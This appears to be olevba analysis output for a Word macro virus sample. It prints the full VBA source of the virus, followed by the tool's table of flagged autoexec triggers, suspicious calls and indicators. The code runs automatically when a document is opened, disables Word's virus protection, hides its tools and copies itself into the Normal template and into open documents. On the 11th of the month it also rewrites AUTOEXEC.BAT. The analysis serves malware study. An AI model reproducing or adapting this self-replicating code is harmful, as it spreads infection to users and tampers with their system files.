olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Thus-based-b4aff7342129bebe2fa9deee0486d95cc4b18020
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Thus-based-b4aff7342129bebe2fa9deee0486d95cc4b18020 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub AutoOpen()
'CSP_Cumpleaños'
On Error Resume Next
Application.Options.VirusProtection = False
If Application.ShowVisualBasicEditor = True Then
Application.ShowVisualBasicEditor = False
End If
CommandBars("Tools").Controls("Macro").Delete
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) <> "'CSP_Cumpleaños'" Then
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
.DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1) _
.CodeModule.CountOfLines
End If
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
.InsertLines 1, ActiveDocument.VBProject.VBComponents.Item(1) _
.CodeModule.Lines(1, ActiveDocument.VBProject.VBComponents _
.Item(1).CodeModule.CountOfLines)
End If
If NormalTemplate.Saved = False Then NormalTemplate.Save
For i = 1 To Application.Documents.Count
If Application.Documents.Item(i).VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) <> "'CSP_Cumpleaños'" Then
Application.Documents.Item(i).VBProject.VBComponents.Item(1) _
.CodeModule.DeleteLines 1, Application.Documents.Item(i) _
.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
End If
If Application.Documents.Item(i).VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
Application.Documents.Item(i).VBProject.VBComponents.Item(1) _
.CodeModule.InsertLines 1, NormalTemplate.VBProject.VBComponents _
.Item(1).CodeModule.Lines(1, NormalTemplate.VBProject _
.VBComponents.Item(1).CodeModule.CountOfLines)
End If
Next i
If Not "C:\WINDOWS\COMMAND\QBASIC.EXE" Then
FileCopy "A:\~WD01106.doc", "C:\WINDOWS\COMMAND\QBASIC.EXE"
End If
If (Day(Now()) = 11) Then
On Error Resume Next
SetAttr "C:\AUTOEXEC.BAT", vbNormal
FileCopy "C:\AUTOEXEC.BAT", "C:\CSP_C_AU.BAT"
Open "C:\AUTOEXEC.BAT" For Output As #1
Print #1, "@ECHO OFF"
Print #1, "PATH=C:\WINDOWS;C:\WINDOWS\COMMAND"
Print #1, "ATTRIB -R -S -H C:\CSP_C.BAS"
Print #1, "ATTRIB -R -S -H C:\AUTOEXEC.BAT"
Print #1, "ATTRIB -R -S -H C:\CSP_C_AU.BAT"
Print #1, "ATTRIB -R -S -H C:\CHAPANA.BAT"
Print #1, "CLS"
Print #1, "QBASIC/RUN CSP_C.BAS"
Print #1, "CLS"
Print #1, "ECHO ""CSP_CUMPLEA¥OS"""
Print #1, "ECHO."
Print #1, "ECHO ANDAHUAYLAS - APURIMAC - PERU"
Print #1, "ECHO."
Print #1, "ECHO 1 DE ENERO DEL 2000"
Print #1, "ECHO."
Print #1, "ECHO (CHAPANA)"
Print #1, "ECHO."
Print #1, "PAUSE"
Print #1, "CLS"
Print #1, "C:\CHAPANA.BAT"
Close #1
Open "C:\CSP_C.BAS" For Output As #1
Print #1, "LOCATE 12, 13"
Print #1, "PRINT ""EL 11 DE JUNIO ES EL CUMPLEA¥OS DE CHAPANA CELEBREMOS!!!"""
Print #1, "PLAY ""O3 C8 C8 D2"""
Print #1, "PLAY ""CG F2 C8 O4 O3 AF"""
Print #1, "PLAY ""E D2 T90 B-8 B-8 AF GF.P2"""
Print #1, "SYSTEM"
Close #1
Open "C:\CHAPANA.BAT" For Output As #1
Print #1, "DEL AUTOEXEC.BAT"
Print #1, "DEL CSP_C.BAS"
Print #1, "REN CSP_C_AU.BAT AUTOEXEC.BAT"
Print #1, "ATTRIB +R +S +H C:\AUTOEXEC.BAT"
Print #1, "CD WINDOWS\COMMAND"
Print #1, "DEL QBASIC.EXE"
Print #1, "CD\"
Print #1, "DEL CHAPANA.BAT"
Close #1
SetAttr "C:\CSP_C.BAS", vbReadOnly + vbSystem + vbHidden
SetAttr "C:\CSP_C_AU.BAT", vbReadOnly + vbSystem + vbHidden
SetAttr "C:\AUTOEXEC.BAT", vbReadOnly + vbSystem + vbHidden
SetAttr "C:\CHAPANA.BAT", vbReadOnly + vbSystem + vbHidden
End If
End Sub
Private Sub HerramMacro()
A = MsgBox("""Acceso denegado por CSP_Cumpleaños""", vbSystemModal + vbExclamation, "CreatingSoft Publicitario 2000")
End Sub
Private Sub HerramActDesactGrabación()
HerramMacro
End Sub
Private Sub Security()
HerramMacro
End Sub
Private Sub ViewVBcode()
HerramMacro
End Sub
Private Sub Document_Open()
AutoOpen
End Sub
Private Sub Document_New()
AutoOpen
End Sub
Private Sub Document_Close()
AutoClose
End Sub
Private Sub AutoClose()
On Error Resume Next
FileCopy "C:\WINDOWS\COMMAND\QBASIC.EXE", "A:\~WD01106.doc"
SetAttr "A:\~WD01106.doc", vbReadOnly + vbSystem + vbHidden
SetAttr "C:\AUTOEXEC.BAT", vbReadOnly + vbSystem + vbHidden
AutoOpen
End Sub





















+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AUTOEXEC            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|RUN                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|COMMAND             |May run PowerShell commands                  |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|SYSTEM              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |QBASIC.EXE          |Executable file name                         |
|IOC       |AUTOEXEC.BAT        |Executable file name                         |
|IOC       |CSP_C_AU.BAT        |Executable file name                         |
|IOC       |CHAPANA.BAT         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

